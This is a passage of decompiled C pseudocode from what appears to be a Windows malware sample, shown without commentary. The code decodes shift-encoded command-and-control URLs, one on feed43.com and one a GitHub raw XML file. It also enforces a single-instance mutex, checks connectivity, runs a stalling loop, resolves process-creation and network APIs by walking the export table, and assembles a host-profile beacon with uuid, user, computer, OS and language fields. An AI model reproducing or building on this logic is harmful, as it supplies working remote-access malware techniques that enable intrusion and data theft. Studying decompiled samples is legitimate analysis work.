                                goto lab_0x40a3dc;
                            } else {
                                // 0x40a3ca
                                v24 = v38 + 8 + (v38 >> 31 & 7) & -8;
                                goto lab_0x40a3dc;
                            }
                        } else {
                            // 0x40a3c3
                            v24 = v38;
                            if ((v38 + 7 & 7) == 7) {
                                goto lab_0x40a3dc;
                            } else {
                                // 0x40a3ca
                                v24 = v38 + 8 + (v38 >> 31 & 7) & -8;
                                goto lab_0x40a3dc;
                            }
                        }
                    }
                }
            }
        }
    }
  lab_0x40a492:;
    int32_t v40 = (int32_t)v23;
    *(int32_t *)(v40 - 4) = v17;
    LocalFree(&g32);
    *(int32_t *)(v40 - 8) = g25;
    ReleaseMutex(&g32);
    return _40___security_check_cookie_40_4();
  lab_0x40a464:
    // 0x40a464
    *(int32_t *)(v25 - 4) = v17;
    LocalFree(&g32);
    *(int32_t *)(v25 - 8) = g25;
    ReleaseMutex(&g32);
    return _40___security_check_cookie_40_4();
  lab_0x40a3dc:;
    int32_t v41 = &v27; // 0x40a3a9
    int32_t * v42; // 0x40a220
    if (v24 < 1) {
        // 0x40a3dc
        v42 = (int32_t *)(v41 - 4);
    } else {
        int32_t * v43 = (int32_t *)(v41 - 4);
        int32_t v44 = (v24 - 1) / 8 + 1; // 0x40a3ef
        int32_t v45; // bp-144412, 0x40a220
        *v43 = (int32_t)&v45;
        function_4068d0((int32_t)&g32);
        v44--;
        v42 = v43;
        while (v44 != 0) {
            // 0x40a3f0
            *v43 = (int32_t)&v45;
            function_4068d0((int32_t)&g32);
            v44--;
            v42 = v43;
        }
    }
    int32_t v46 = (int32_t)&v26; // 0x40a410
    *v42 = (int32_t)"http://";
    *(int32_t *)(v41 - 8) = v46;
    char * v47 = StrStrIA((char *)&g32, (char *)&g32); // 0x40a41e
    *(int32_t *)(v41 - 12) = (int32_t)"https://";
    int32_t v48; // bp-237, 0x40a220
    int32_t v49 = v47 == NULL ? v46 : (int32_t)&v48; // 0x40a42d
    int32_t v50 = v41 - 16; // 0x40a430
    *(int32_t *)v50 = v49;
    int32_t v51 = StrStrIA((char *)&g32, (char *)&g32) == NULL ? v49 : v49 + 8;
    char v52 = *(char *)v51; // 0x40a43a
    int32_t v53 = 0; // 0x40a446
    if (v52 != 47) {
        char v54 = v52; // 0x40a44c
        int32_t v55 = 0; // 0x40a44c
        int32_t v56 = v51; // 0x40a44c
        v53 = v55;
        while (v54 != 0) {
            // 0x40a454
            *(char *)(uFlags - v51 + v56) = v54;
            v55++;
            v56++;
            v54 = *(char *)v56;
            v53 = v55;
            if (v54 == 47) {
                // break -> 0x40a460
                break;
            }
            v53 = v55;
        }
    }
    // 0x40a460
    *(char *)(v53 + uFlags) = 0;
    v25 = v50;
    goto lab_0x40a464;
}

// Address range: 0x40a4d0 - 0x40a7a0
int32_t function_40a4d0(void) {
    // 0x40a4d0
    int32_t v1; // bp-1192, 0x40a4d0
    _memset(&v1, 0, 960);
    int32_t lpString1; // bp-952, 0x40a4d0
    lstrcpyA((char *)&lpString1, "iuuqt;00gffe54/dpn09719147393382293/ynm");
    int32_t lpString1_; // bp-872, 0x40a4d0
    char * v2 = (char *)&lpString1_; // bp-1240, 0x40a527
    lstrcpyA((char *)&lpString1_, "iuuqt;00sbx/hjuivcvtfsdpoufou/dpn0sj{wjsfinbo0si1n0nbtufs0ynm/ynm");
    int128_t v3 = __asm_movdqa(0x6d6d6a7b704e3b756f66684273667456); // 0x40a52a
    int128_t v4 = __asm_movdqa(g7); // 0x40a535
    int128_t v5; // 0x40a4d0
    __asm_movdqu_10(v5, v3);
    __asm_movdqu_10(0, __asm_movdqa(g17));
    int128_t v6; // 0x40a4d0
    __asm_movdqu_10(v6, __asm_movdqa(g18));
    int128_t v7; // 0x40a4d0
    __asm_movdqu_10(v7, __asm_movdqa(g16));
    int128_t v8; // 0x40a4d0
    __asm_movdqu_10(v8, __asm_movdqa(g20));
    int128_t v9; // 0x40a4d0
    __asm_movdqu_10(v9, __asm_movdqa(g13));
    int128_t v10; // bp-112, 0x40a4d0
    int32_t v11 = &v10; // 0x40a5a6
    int32_t v12 = 3; // 0x40a5a6
    int128_t * v13 = (int128_t *)(v11 - 16); // 0x40a5b3
    __asm_movdqu_10(*v13, __asm_psubb(__asm_movdqu(*v13), v4));
    int128_t * v14 = (int128_t *)v11; // 0x40a5c1
    __asm_movdqu_10(*v14, __asm_psubb(__asm_movdqu(*v14), v4));
    v12--;
    v11 += 32;
    while (v12 != 0) {
        // 0x40a5b0
        v13 = (int128_t *)(v11 - 16);
        __asm_movdqu_10(*v13, __asm_psubb(__asm_movdqu(*v13), v4));
        v14 = (int128_t *)v11;
        __asm_movdqu_10(*v14, __asm_psubb(__asm_movdqu(*v14), v4));
        v12--;
        v11 += 32;
    }
    for (int32_t i = 96; i < 109; i++) {
        // 0x40a5d2
        int32_t v15; // bp-4, 0x40a4d0
        char * v16 = (char *)((int32_t)&v15 - 124 + i); // 0x40a5d2
        *v16 = *v16 - 1;
    }
    char * lpString = (char *)12; // 0x40a5e8
    int32_t v17 = &v1;
    int32_t v18 = (int32_t)&v2 - 4; // 0x40a5f2
    *(int32_t *)v18 = v17;
    int32_t v19 = v18; // 0x40a5f9
    int32_t v20 = 0; // 0x40a5f9
    int32_t v21 = v18; // 0x40a5f9
    char * v22; // 0x40a600
    int32_t v23; // 0x40a603
    int32_t v24; // 0x40a604
    uint32_t v25; // 0x40a605
    if (lstrlenA(lpString) >= 1) {
        v22 = (char *)(v20 + v17);
        *v22 = *v22 - 1;
        v23 = v20 + 1;
        v24 = v19 - 4;
        *(int32_t *)v24 = v17;
        v25 = lstrlenA((char *)&g32);
        v19 = v24;
        v20 = v23;
        v21 = v24;
        while (v23 < v25) {
            // 0x40a600
            v22 = (char *)(v20 + v17);
            *v22 = *v22 - 1;
            v23 = v20 + 1;
            v24 = v19 - 4;
            *(int32_t *)v24 = v17;
            v25 = lstrlenA((char *)&g32);
            v19 = v24;
            v20 = v23;
            v21 = v24;
        }
    }
    int32_t v26 = v21;
    int32_t v27 = (int32_t)lpString - 1; // 0x40a60e
    lpString = (char *)v27;
    int32_t v28 = v17 + 80; // 0x40a614
    while (v27 != 0) {
        // 0x40a5f2
        v17 = v28;
        v18 = v26 - 4;
        *(int32_t *)v18 = v17;
        v19 = v18;
        v20 = 0;
        v21 = v18;
        if (lstrlenA(lpString) >= 1) {
            v22 = (char *)(v20 + v17);
            *v22 = *v22 - 1;
            v23 = v20 + 1;
            v24 = v19 - 4;
            *(int32_t *)v24 = v17;
            v25 = lstrlenA((char *)&g32);
            v19 = v24;
            v20 = v23;
            v21 = v24;
            while (v23 < v25) {
                // 0x40a600
                v22 = (char *)(v20 + v17);
                *v22 = *v22 - 1;
                v23 = v20 + 1;
                v24 = v19 - 4;
                *(int32_t *)v24 = v17;
                v25 = lstrlenA((char *)&g32);
                v19 = v24;
                v20 = v23;
                v21 = v24;
            }
        }
        // 0x40a60b
        v26 = v21;
        v27 = (int32_t)lpString - 1;
        lpString = (char *)v27;
        v28 = v17 + 80;
    }
    // 0x40a616
    *(int32_t *)(v26 - 4) = 50;
    *(int32_t *)(v26 - 8) = 64;
    int32_t * memoryHandle = LocalAlloc(0, (int32_t)&g32); // 0x40a61a
    int32_t v29 = (int32_t)memoryHandle; // 0x40a61a
    *(int32_t *)(v26 - 12) = 0;
    *(int32_t *)(v26 - 16) = 0;
    *(int32_t *)(v26 - 20) = 0;
    *memoryHandle = 0x6c707061;
    *(int32_t *)(v29 + 4) = 0x74616369;
    *(int32_t *)(v29 + 8) = 0x2f6e6f69;
    *(int32_t *)(v29 + 12) = 0x77772d78;
    *(int32_t *)(v29 + 16) = 0x6f662d77;
    *(int32_t *)(v29 + 20) = 0x752d6d72;
    *(int32_t *)(v29 + 24) = 0x6e656c72;
    *(int32_t *)(v29 + 28) = 0x65646f63;
    *(int16_t *)(v29 + 32) = 100;
    *(int32_t *)(v26 - 24) = 1;
    int128_t v30; // bp-128, 0x40a4d0
    *(int32_t *)(v26 - 28) = (int32_t)&v30;
    int32_t * v31 = InternetOpenA((char *)&g32, (int32_t)&g32, (char *)&g32, (char *)&g32, (int32_t)&g32); // 0x40a669
    g30 = (int32_t)v31;
    *(int32_t *)(v26 - 32) = 0;
    int32_t v32; // bp-1208, 0x40a4d0
    *(int32_t *)(v26 - 36) = (int32_t)&v32;
    if (!InternetGetConnectedState(&g32, (int32_t)&g32) || g30 == 0) {
        // 0x40a78d
        return _40___security_check_cookie_40_4();
    }
    int128_t v33 = __asm_movdqa(0x70696b69772e6e652f2f3a7370747468); // 0x40a698
    *(int32_t *)(v26 - 40) = 0;
    *(int32_t *)(v26 - 44) = 1;
    int128_t v34; // bp-232, 0x40a4d0
    *(int32_t *)(v26 - 48) = (int32_t)&v34;
    __asm_movdqu_10(0, v33);
    if (!InternetCheckConnectionA((char *)0x61696465, 0x67726f2e, 0)) {
        // 0x40a78d
        return _40___security_check_cookie_40_4();
    }
    // 0x40a6dc
    int32_t v35; // 0x40a4d0
    if (function_409da0() != 0) {
        // 0x40a6f3
        *(int32_t *)(v26 - 52) = (int32_t)"blog1";
        _printf((char *)&g32);
        // 0x40a700
        *(int32_t *)v35 = 1;
        return _40___security_check_cookie_40_4();
    }
    // 0x40a722
    if (function_409da0() != 0 || function_409da0() != 0 || function_40a220() != 0 || function_40a220() != 0) {
        // 0x40a700
        *(int32_t *)v35 = 1;
        return _40___security_check_cookie_40_4();
    }
    // 0x40a772
    if (function_40a220() == 0) {
        // 0x40a78d
        return _40___security_check_cookie_40_4();
    }
    // 0x40a700
    *(int32_t *)v35 = 1;
    return _40___security_check_cookie_40_4();
}

// Address range: 0x40a7a0 - 0x40a7ee
int32_t function_40a7a0(void) {
    // 0x40a7a0
    int32_t v1; // bp-12, 0x40a7a0
    int32_t v2 = &v1; // 0x40a7a7
    int32_t v3 = 3;
    int32_t v4 = 2;
    int32_t v5 = v3 - 1; // 0x40a7b5
    int32_t v6; // 0x40a7a0
    int32_t v7 = v6; // 0x40a7ba
    int32_t v8 = 2; // 0x40a7ba
    int32_t v9; // 0x40a7a0
    int64_t v10; // 0x40a7c3
    int64_t v11; // 0x40a7c3
    int32_t v12; // 0x40a7c9
    if (v5 >= 2) {
        // 0x40a7c0
        v10 = 0x100000000 * (int64_t)(v3 >> 31) | (int64_t)v3;
        v9 = 2;
        v11 = v9;
        v8 = v9;
        while ((int32_t)(v10 % v11) != 0) {
            // 0x40a7c9
            v12 = v9 + 1;
            v8 = v12;
            if (v12 > v5) {
                // break -> 0x40a7ce
                break;
            }
            v9 = v12;
            v11 = v9;
            v8 = v9;
        }
        // 0x40a7ce
        v7 = v10 / v11;
    }
    int32_t v13 = v7; // 0x40a7d0
    int32_t v14 = v4; // 0x40a7d0
    if (v8 == v3) {
        // 0x40a7d2
        *(int32_t *)(v2 - 4) = v3;
        *(int32_t *)(v2 - 8) = (int32_t)"%d\n";
        v13 = _printf((char *)&g32);
        v14 = v4 + 1;
    }
    int32_t result = v13;
    int32_t v15 = v3 + 1; // 0x40a7e8
    while (v14 < 0x13881) {
        // 0x40a7b0
        v3 = v15;
        v4 = v14;
        v5 = v3 - 1;
        v7 = result;
        int32_t v16 = 2; // 0x40a7ba
        if (v5 >= 2) {
            // 0x40a7c0
            v10 = 0x100000000 * (int64_t)(v3 >> 31) | (int64_t)v3;
            v9 = 2;
            v11 = v9;
            v8 = v9;
            while ((int32_t)(v10 % v11) != 0) {
                // 0x40a7c9
                v12 = v9 + 1;
                v8 = v12;
                if (v12 > v5) {
                    // break -> 0x40a7ce
                    break;
                }
                v9 = v12;
                v11 = v9;
                v8 = v9;
            }
            // 0x40a7ce
            v7 = v10 / v11;
            v16 = v8;
        }
        // 0x40a7ce
        v13 = v7;
        v14 = v4;
        if (v16 == v3) {
            // 0x40a7d2
            *(int32_t *)(v2 - 4) = v3;
            *(int32_t *)(v2 - 8) = (int32_t)"%d\n";
            v13 = _printf((char *)&g32);
            v14 = v4 + 1;
        }
        // 0x40a7e1
        result = v13;
        v15 = v3 + 1;
    }
    // 0x40a7ea
    return result;
}

// Address range: 0x40a7f0 - 0x40b0e6
int32_t function_40a7f0(int32_t a1) {
    int32_t v1 = a1;
    __chkstk();
    int128_t v2 = __asm_movq(0x33346d666f73666c); // 0x40a813
    int32_t v3 = &v1; // bp-28, 0x40a83f
    int32_t v4 = &v3; // 0x40a83f
    __asm_movq_9((int64_t)a1, v2);
    uint32_t v5 = lstrlenA((char *)&g32); // 0x40a849
    int32_t v6 = v4; // 0x40a84d
    int32_t v7 = 0; // 0x40a84d
    int32_t v8 = v4; // 0x40a84d
    if (v5 >= 1) {
        int32_t v9 = v6 + 792; // 0x40a850
        char * v10 = (char *)(v9 + v7); // 0x40a850
        *v10 = *v10 - 1;
        v6 -= 4;
        *(int32_t *)v6 = v9;
        v7++;
        uint32_t v11 = lstrlenA((char *)&g32); // 0x40a860
        v8 = v6;
        while (v7 < v11) {
            // 0x40a850
            v9 = v6 + 792;
            v10 = (char *)(v9 + v7);
            *v10 = *v10 - 1;
            v6 -= 4;
            *(int32_t *)v6 = v9;
            v7++;
            v11 = lstrlenA((char *)&g32);
            v8 = v6;
        }
    }
    int32_t v12 = v8;
    *(int32_t *)(v12 - 4) = (int32_t)"CreateMutexA";
    *(int32_t *)(v12 - 8) = v12 + 792;
    *(int32_t *)(v12 - 12) = (int32_t)GetModuleHandleA((char *)&g32);
    int32_t (*func)() = GetProcAddress(&g32, (char *)&g32); // 0x40a87a
    int128_t v13 = __asm_movdqu(0x70615f796e61706d6f63796d5f6d6f63); // 0x40a880
    *(int16_t *)(v12 + 964) = 121;
    int32_t v14 = v12 + 916; // 0x40a897
    __asm_movdqu_10(*(int128_t *)v14, v13);
    *(int32_t *)(v12 - 16) = v14;
    int128_t v15 = __asm_movdqu(0x6d5f77656e5f656d616e7070615f7370); // 0x40a8a8
    *(int32_t *)(v12 - 20) = 1;
    *(int32_t *)(v12 - 24) = 0;
    __asm_movdqu_10(*(int128_t *)(v12 + 932), v15);
    g27 = (int32_t)func;
    __asm_movdqu_10(*(int128_t *)(v12 + 948), __asm_movdqu(0x6e706d6f636b6375646c616e6f645f79));
    int32_t errorCode = GetLastError(); // 0x40a8d5
    int32_t * v16 = (int32_t *)(v12 - 28); // 0x40a8db
    *v16 = 0;
    if (errorCode == 183) {
        // 0x40a8e4
        ExitProcess((int32_t)&g32);
        // UNREACHABLE
    }
    // 0x40a8ea
    *(int32_t *)(v12 - 32) = 1;
    *(int32_t *)(v12 - 36) = (int32_t)"https://en.wikipedia.org";
    InternetCheckConnectionA((char *)&g32, (int32_t)&g32, (int32_t)&g32);
    function_40a7a0();
    *(int32_t *)(v12 - 40) = (int32_t)L"kernel32.dll";
    LoadLibraryW((int16_t *)&g32);
    int32_t v17 = v12 - 44; // 0x40a907
    *(int32_t *)v17 = (int32_t)L"kernel32.dll";
    int32_t v18 = (int32_t)GetModuleHandleW((int16_t *)&g32); // 0x40a90c
    __asm_movdqu_10(*(int128_t *)(v12 + 696), __asm_movdqa(0x6d614e656c6946656c75646f4d746547));
    *(int16_t *)(v12 + 712) = 0x4165;
    *(char *)(v12 + 714) = 0;
    int32_t v19 = *(int32_t *)(v18 + 120 + *(int32_t *)(v18 + 60)) + v18;
    int32_t v20 = *(int32_t *)(v19 + 32) + v18; // 0x40a946
    int32_t v21 = *(int32_t *)(v19 + 24) - 1; // 0x40a948
    *v16 = v20;
    int32_t v22 = v21; // 0x40a94d
    int32_t v23 = v17; // 0x40a94d
    if (v21 >= 0) {
        int32_t v24 = v17;
        *(int32_t *)(v24 - 4) = v24 + 740;
        int32_t v25 = v24 - 8; // 0x40a95d
        *(int32_t *)v25 = *(int32_t *)(4 * v22 + v20) + v18;
        int32_t v26 = lstrcmpA((char *)&g32, (char *)&g32); // 0x40a95e
        v23 = v25;
        while (v26 != 0) {
            // 0x40a968
            v22--;
            int32_t v27 = *(int32_t *)(v24 + 8); // 0x40a969
            v23 = v25;
            if (v22 < 0) {
                // break -> 0x40a96f
                break;
            }
            v24 = v25;
            *(int32_t *)(v24 - 4) = v24 + 740;
            v25 = v24 - 8;
            *(int32_t *)v25 = *(int32_t *)(4 * v22 + v27) + v18;
            v26 = lstrcmpA((char *)&g32, (char *)&g32);
            v23 = v25;
        }
    }
    int32_t v28 = v23;
    int32_t v29 = v28 + 740; // 0x40a976
    int32_t * v30 = (int32_t *)v29; // 0x40a976
    *v30 = 0x61657243;
    int32_t * v31 = (int32_t *)(v28 + 744); // 0x40a983
    *v31 = 0x72506574;
    int32_t * v32 = (int32_t *)(v28 + 748); // 0x40a98e
    *v32 = 0x7365636f;
    int32_t v33 = v28 + 752; // 0x40a999
    int16_t * v34 = (int16_t *)v33; // 0x40a999
    *v34 = 0x4173;
    char * v35 = (char *)(v28 + 754); // 0x40a9a3
    *v35 = 0;
    g26 = function_406f10();
    *v30 = 0x61657243;
    *v31 = 0x72506574;
    *v32 = 0x7365636f;
    *v34 = 0x5773;
    *v35 = 0;
    g28 = function_406f10();
    *v30 = 0x54746547;
    *v31 = 0x50706d65;
    *v32 = 0x41687461;
    char * v36 = (char *)v33; // 0x40aa25
    *v36 = 0;
    g23 = function_406f10();
    *v30 = 0x64616f4c;
    *v31 = 0x7262694c;
    *v32 = 0x41797261;
    *v36 = 0;
    int32_t v37 = function_406f10(); // 0x40aa69
    *(int32_t *)(v28 - 4) = (int32_t)L"Ws2_32.dll";
    g24 = v37;
    LoadLibraryW((int16_t *)&g32);
    *(int32_t *)(v28 - 8) = (int32_t)L"Ws2_32.dll";
    GetModuleHandleW((int16_t *)&g32);
    *(int32_t *)(v28 + 732) = 0x53415357;
    *(int32_t *)(v28 + 736) = 0x74726174;
    *(int16_t *)v29 = 0x7075;
    *(char *)(v28 + 742) = 0;
    int32_t v38 = function_406f10(); // 0x40aaba
    *(int32_t *)(v28 - 12) = v28 + 320;
    *(int32_t *)(v28 - 16) = 514;
    if (v38 != 0) {
        // 0x40aad2
        return _40___security_check_cookie_40_4();
    }
    int128_t v39 = __asm_movdqa(g21); // 0x40aaeb
    int32_t v40 = v28 + 808; // 0x40aaf3
    int128_t v41 = __asm_movdqa(g7); // 0x40aafa
    int32_t v42 = v28 + 792; // 0x40ab07
    __asm_movdqu_10(*(int128_t *)v42, v39);
    *(int32_t *)v28 = 0;
    __asm_movdqu_10(*(int128_t *)v40, __asm_movdqa(g9));
    *(int32_t *)(v28 + 904) = 0xb0e0b;
    __asm_movdqu_10(*(int128_t *)(v28 + 824), __asm_movdqa(0x7171422a35375850583c322f3721554f));
    __asm_movdqu_10(*(int128_t *)(v28 + 840), __asm_movdqa(g15));
    __asm_movdqu_10(*(int128_t *)(v28 + 856), __asm_movdqa(g10));
    __asm_movdqu_10(*(int128_t *)(v28 + 872), __asm_movdqa(g12));
    __asm_movdqu_10(*(int128_t *)(v28 + 888), __asm_movdqa(g8));
    int32_t v43 = v40; // 0x40ab8c
    int32_t v44 = 3; // 0x40ab8c
    int128_t * v45 = (int128_t *)(v43 - 16); // 0x40ab93
    __asm_movdqu_10(*v45, __asm_psubb(__asm_movdqu(*v45), v41));
    int128_t * v46 = (int128_t *)v43; // 0x40aba1
    int128_t v47 = __asm_psubb(__asm_movdqu(*v46), v41); // 0x40aba6
    __asm_movdqu_10(*v46, v47);
    v44--;
    v43 += 32;
    int32_t v48 = 96; // 0x40abb0
    while (v44 != 0) {
        // 0x40ab90
        v45 = (int128_t *)(v43 - 16);
        __asm_movdqu_10(*v45, __asm_psubb(__asm_movdqu(*v45), v41));
        v46 = (int128_t *)v43;
        v47 = __asm_psubb(__asm_movdqu(*v46), v41);
        __asm_movdqu_10(*v46, v47);
        v44--;
        v43 += 32;
        v48 = 96;
    }
    char * v49 = (char *)(v48 + v42); // 0x40abb2
    *v49 = *v49 - 1;
    int32_t v50 = v48 + 1; // 0x40abb9
    v48 = v50;
    while (v50 != 115) {
        // 0x40abb2
        v49 = (char *)(v48 + v42);
        *v49 = *v49 - 1;
        v50 = v48 + 1;
        v48 = v50;
    }
    int32_t v51 = v28 - 20; // 0x40abbf
    int32_t * v52 = (int32_t *)v51; // 0x40abbf
    *v52 = 284;
    int32_t v53 = v28 + 24; // 0x40abc4
    int32_t * v54 = (int32_t *)(v28 - 24); // 0x40abc8
    *v54 = 0;
    *(int32_t *)(v28 - 28) = v53;
    _memset(&g32, (int32_t)&g32, (int32_t)&g32);
    *(int32_t *)v53 = 284;
    *v52 = v53;
    GetVersionExW((struct _OSVERSIONINFOW *)&g32);
    *(char *)(v28 + 823) = *(char *)v53 + 48;
    *v54 = 115;
    *(char *)(v28 + 825) = *(char *)(v28 + 28) + 48;
    int32_t v55 = v51; // 0x40ac18
    if (function_40a4d0() == 0) {
        int32_t v56 = v51 - 4; // 0x40ac20
        *(int32_t *)v56 = 1000;
        Sleep((int32_t)&g32);
        *(int32_t *)(v51 - 8) = v28 + 1284;
        int32_t v57 = v51 + 1300; // 0x40ac41
        v55 = v56;
        while (function_40a4d0() == 0) {
            int32_t v58 = v56;
            v56 = v58 - 4;
            *(int32_t *)v56 = 1000;
            Sleep((int32_t)&g32);
            *(int32_t *)(v58 - 8) = v57;
            v57 = v58 + 1300;
            v55 = v56;
        }
    }
    int32_t v59 = v55;
    int32_t v60 = v59 - 4; // 0x40ac43
    int32_t * v61 = (int32_t *)v60; // 0x40ac43
    *v61 = 199;
    int32_t v62 = v59 + 1104; // 0x40ac4f
    *(char *)v62 = 0;
    int32_t * v63 = (int32_t *)(v59 - 8); // 0x40ac57
    *v63 = 0;
    int32_t * v64 = (int32_t *)(v59 - 12); // 0x40ac59
    *v64 = v59 + 1105;
    _memset(&g32, (int32_t)&g32, (int32_t)&g32);
    int32_t v65 = v59 + 1000; // 0x40ac62
    *(char *)v65 = 0;
    *v61 = 99;
    *v63 = 0;
    *v64 = v59 + 1001;
    _memset(&g32, (int32_t)&g32, (int32_t)&g32);
    int128_t v66 = __asm_xorps(v47, v47); // 0x40ac7b
    *(char *)(v59 + 737) = 0;
    __asm_movq_9(*(int64_t *)(v59 + 729), v66);
    int32_t v67 = v59 + 728; // 0x40ac92
    int32_t * v68 = (int32_t *)v67; // 0x40ac92
    *v68 = 0x64697575;
    int32_t v69 = v59 + 732; // 0x40ac9f
    int16_t * v70 = (int16_t *)v69; // 0x40ac9f
    *v70 = 61;
    int32_t v71 = v59 + 1103; // 0x40acba
    int32_t v72 = 0; // 0x40aca9
    char v73 = *(char *)(v72 + v67); // 0x40acb0
    v72++;
    *(char *)(v72 + v71) = v73;
    while (v73 != 0) {
        // 0x40acb0
        v73 = *(char *)(v72 + v67);
        v72++;
        *(char *)(v72 + v71) = v73;
    }
    int32_t v74 = function_405dd0(); // 0x40acc5
    int32_t v75 = v74;
    int32_t v76 = v75 + 1; // 0x40acd2
    while (*(char *)v75 != 0) {
        // 0x40acd0
        v75 = v76;
        v76 = v75 + 1;
    }
    int32_t v77 = v71 + 1; // 0x40ace1
    char * v78 = (char *)v77;
    char v79 = *v78; // 0x40ace1
    int32_t v80 = v77; // 0x40ace7
    while (v79 != 0) {
        // 0x40ace1
        v77 = v80 + 1;
        v78 = (char *)v77;
        v79 = *v78;
        v80 = v77;
    }
    uint32_t v81 = v76 - v74; // 0x40acde
    *v68 = 0x3d6e7523;
    uint32_t v82 = v81 / 4; // 0x40acf6
    __asm_rep_movsd_memcpy(v78, (char *)v74, v82);
    bool v83; // 0x40a7f0
    int32_t v84 = v83 ? -4 : 4; // 0x40acf9
    char * v85 = (char *)v69; // 0x40acfd
    *v85 = v79;
    char * v86 = (char *)(v77 + v82 * v84); // 0x40ad0e
    __asm_rep_movsb_memcpy(v86, v86, v81 & 3);
    int32_t v87 = v67;
    int32_t v88 = v87 + 1; // 0x40ad14
    while (*(char *)v87 != 0) {
        // 0x40ad12
        v87 = v88;
        v88 = v87 + 1;
    }
    int32_t v89 = v71 + 1; // 0x40ad23
    char * v90 = (char *)v89;
    int32_t v91 = v89; // 0x40ad29
    while (*v90 != 0) {
        // 0x40ad23
        v89 = v91 + 1;
        v90 = (char *)v89;
        v91 = v89;
    }
    uint32_t v92 = v88 - v67; // 0x40ad20
    uint32_t v93 = v92 / 4; // 0x40ad2d
    char * v94 = (char *)v67; // 0x40ad30
    __asm_rep_movsd_memcpy(v90, v94, v93);
    char * v95 = (char *)(v89 + v93 * v84); // 0x40ad37
    __asm_rep_movsb_memcpy(v95, v95, v92 & 3);
    int32_t v96 = function_4060c0(); // 0x40ad39
    int32_t v97 = v96;
    int32_t v98 = v97 + 1; // 0x40ad44
    while (*(char *)v97 != 0) {
        // 0x40ad42
        v97 = v98;
        v98 = v97 + 1;
    }
    int32_t v99 = v71 + 1; // 0x40ad53
    char * v100 = (char *)v99;
    char v101 = *v100; // 0x40ad53
    int32_t v102 = v99; // 0x40ad59
    while (v101 != 0) {
        // 0x40ad53
        v99 = v102 + 1;
        v100 = (char *)v99;
        v101 = *v100;
        v102 = v99;
    }
    uint32_t v103 = v98 - v96; // 0x40ad50
    *v68 = 0x3d6e6323;
    uint32_t v104 = v103 / 4; // 0x40ad68
    __asm_rep_movsd_memcpy(v100, (char *)v96, v104);
    *v85 = v101;
    char * v105 = (char *)(v99 + v104 * v84); // 0x40ad80
    __asm_rep_movsb_memcpy(v105, v105, v103 & 3);
    int32_t v106 = v67;
    int32_t v107 = v106 + 1; // 0x40ad86
    while (*(char *)v106 != 0) {
        // 0x40ad84
        v106 = v107;
        v107 = v106 + 1;
    }
    int32_t v108 = v71 + 1; // 0x40ad95
    char * v109 = (char *)v108;
    int32_t v110 = v108; // 0x40ad9b
    while (*v109 != 0) {
        // 0x40ad95
        v108 = v110 + 1;
        v109 = (char *)v108;
        v110 = v108;
    }
    uint32_t v111 = v107 - v67; // 0x40ad92
    uint32_t v112 = v111 / 4; // 0x40ad9f
    __asm_rep_movsd_memcpy(v109, v94, v112);
    char * v113 = (char *)(v108 + v112 * v84); // 0x40ada9
    __asm_rep_movsb_memcpy(v113, v113, v111 & 3);
    int32_t v114 = function_406040(); // 0x40adab
    int32_t v115 = v114;
    int32_t v116 = v115 + 1; // 0x40adb6
    while (*(char *)v115 != 0) {
        // 0x40adb4
        v115 = v116;
        v116 = v115 + 1;
    }
    int32_t v117 = v71 + 1; // 0x40adc5
    char * v118 = (char *)v117;
    char v119 = *v118; // 0x40adc5
    int32_t v120 = v117; // 0x40adcb
    while (v119 != 0) {
        // 0x40adc5
        v117 = v120 + 1;
        v118 = (char *)v117;
        v119 = *v118;
        v120 = v117;
    }
    uint32_t v121 = v116 - v114; // 0x40adc2
    *v68 = 0x3d6e6f23;
    uint32_t v122 = v121 / 4; // 0x40adda
    __asm_rep_movsd_memcpy(v118, (char *)v114, v122);
    *v85 = v119;
    char * v123 = (char *)(v117 + v122 * v84); // 0x40adf2
    __asm_rep_movsb_memcpy(v123, v123, v121 & 3);
    int32_t v124 = v67;
    int32_t v125 = v124 + 1; // 0x40adf8
    while (*(char *)v124 != 0) {
        // 0x40adf6
        v124 = v125;
        v125 = v124 + 1;
    }
    int32_t v126 = v71 + 1; // 0x40ae07
    char * v127 = (char *)v126;
    int32_t v128 = v126; // 0x40ae0d
    while (*v127 != 0) {
        // 0x40ae07
        v126 = v128 + 1;
        v127 = (char *)v126;
        v128 = v126;
    }
    uint32_t v129 = v125 - v67; // 0x40ae04
    uint32_t v130 = v129 / 4; // 0x40ae11
    __asm_rep_movsd_memcpy(v127, v94, v130);
    char * v131 = (char *)(v126 + v130 * v84); // 0x40ae1b
    __asm_rep_movsb_memcpy(v131, v131, v129 & 3);
    int32_t v132 = function_4062a0(); // 0x40ae1d
    int32_t v133 = v132;
    int32_t v134 = v133 + 1; // 0x40ae28
    while (*(char *)v133 != 0) {
        // 0x40ae26
        v133 = v134;
        v134 = v133 + 1;
    }
    int32_t v135 = v71 + 1; // 0x40ae37
    char * v136 = (char *)v135;
    int32_t v137 = v135; // 0x40ae3d
    while (*v136 != 0) {
        // 0x40ae37
        v135 = v137 + 1;
        v136 = (char *)v135;
        v137 = v135;
    }
    uint32_t v138 = v134 - v132; // 0x40ae34
    *v68 = 0x6e616c23;
    uint32_t v139 = v138 / 4; // 0x40ae4c
    __asm_rep_movsd_memcpy(v136, (char *)v132, v139);
    *v70 = 61;
    char * v140 = (char *)(v135 + v139 * v84); // 0x40ae67
    __asm_rep_movsb_memcpy(v140, v140, v138 & 3);
    int32_t v141 = v67;
    int32_t v142 = v141 + 1; // 0x40ae72
    while (*(char *)v141 != 0) {
        // 0x40ae70
        v141 = v142;
        v142 = v141 + 1;
    }
    int32_t v143 = v71 + 1; // 0x40ae81
    char * v144 = (char *)v143;
    int32_t v145 = v143; // 0x40ae87
    while (*v144 != 0) {
        // 0x40ae81
        v143 = v145 + 1;
        v144 = (char *)v143;
        v145 = v143;
    }
    uint32_t v146 = v142 - v67; // 0x40ae7e
    uint32_t v147 = v146 / 4; // 0x40ae8b
    __asm_rep_movsd_memcpy(v144, v94, v147);
    char * v148 = (char *)(v143 + v147 * v84); // 0x40ae95
    __asm_rep_movsb_memcpy(v148, v148, v146 & 3);
    int32_t v149 = function_406400(); // 0x40ae97
    int32_t v150 = v149;
    int32_t v151 = v150 + 1; // 0x40aea2
    while (*(char *)v150 != 0) {
        // 0x40aea0
        v150 = v151;
        v151 = v150 + 1;
    }
    int32_t v152 = v71 + 1; // 0x40aeb1
    char * v153 = (char *)v152;
    int32_t v154 = v152; // 0x40aeb7
    while (*v153 != 0) {
        // 0x40aeb1
        v152 = v154 + 1;
        v153 = (char *)v152;
        v154 = v152;
    }
    uint32_t v155 = v151 - v149; // 0x40aeae
    *v68 = 0x706f6e23;
    uint32_t v156 = v155 / 4; // 0x40aec6
